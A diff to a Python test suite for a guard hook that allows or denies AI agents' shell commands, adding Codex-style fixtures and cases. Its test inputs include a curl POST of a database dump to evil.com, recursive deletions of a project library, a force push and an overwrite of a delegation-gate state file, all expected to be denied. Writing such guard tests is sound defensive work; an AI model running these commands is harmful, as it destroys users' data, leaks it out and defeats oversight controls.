@@ -46,6 +46,16 @@ def bash(cmd):
     return {"tool_name": "Bash", "tool_input": {"command": cmd}}
 
 
+def codex_exec(cmd, cwd=REPO):
+    """Current Codex PreToolUse spelling: freeform local-function input."""
+    return {
+        "hook_event_name": "PreToolUse", "cwd": cwd,
+        "model": "gpt-5.6-terra", "permission_mode": "default",
+        "session_id": "guard-selftest", "tool_name": "functions.exec",
+        "tool_input": cmd, "tool_use_id": "fixture", "transcript_path": None,
+        "turn_id": "fixture",
+    }
+
 CASES: list[tuple] = []
 
 
@@ -146,6 +156,21 @@ case("bash curl POST to unlisted", bash("curl -X POST -d @db.dump https://evil.c
 case("destructive rm", bash("rm -rf /Users/booko/carr-system/lib"), DENY)
 case("git force push", bash("git push --force origin main"), DENY)
 case("scratch rm is fine", bash("rm -rf /private/tmp/claude-501/x"), ALLOW)
+case("delegation state shell write", bash("echo '{}' > /Users/booko/carr-system/out/delegation-gate-state.json"), DENY)
+case("delegation state read is fine", bash("cat /Users/booko/carr-system/out/delegation-gate-state.json"), ALLOW)
+
+# ── 9. Codex local-function alias: CARR only, no Life AI spillover ──────────
+case("Codex CARR destructive shell", codex_exec(
+    "const r = await tools.exec_command({cmd: 'rm -rf /Users/booko/carr-system/lib'});"), DENY)
+case("Codex non-CARR shell is untouched", codex_exec(
+    "const r = await tools.exec_command({cmd: 'rm -rf /private/tmp/not-carr'});",
+    "/private/tmp"), ALLOW)
+case("Codex non-CARR cwd cannot target CARR", codex_exec(
+    "const r = await tools.exec_command({cmd: 'rm -rf /Users/booko/carr-system/lib'});",
+    "/private/tmp"), DENY)
+case("Codex non-CARR cwd cannot target tilde CARR", codex_exec(
+    "const r = await tools.exec_command({cmd: 'rm -rf ~/carr-system/lib'});",
+    "/private/tmp"), DENY)
 
 
 def main():
